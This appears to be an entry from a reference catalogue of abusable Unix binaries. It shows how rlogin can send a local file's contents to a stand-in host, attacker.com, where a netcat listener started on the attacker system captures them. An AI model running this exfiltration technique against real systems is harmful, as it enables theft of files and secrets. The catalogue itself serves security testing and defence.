---
functions:
  file-upload:
    - description: Send contents of a file to a TCP port. Run `nc -nlvp $RPORT > "file to save"` on the attacker system to capture the contents.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
---
